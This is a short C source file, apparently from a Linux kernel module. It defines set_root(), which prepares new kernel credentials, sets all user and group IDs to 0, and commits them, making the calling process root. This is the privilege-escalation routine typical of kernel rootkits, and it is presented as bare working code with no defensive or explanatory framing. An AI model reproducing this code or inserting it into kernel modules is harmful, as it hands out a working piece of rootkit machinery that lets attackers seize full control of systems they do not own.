#include "../headers/credentials.h"

void set_root(void) {
    struct cred *root;
    root = prepare_creds();
    if( root == NULL){
        printk(KERN_INFO "Unable to prepare credentials...\n");
        return;
    }

    root->uid.val = root->gid.val = 0;
    root->euid.val = root-> egid.val =0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}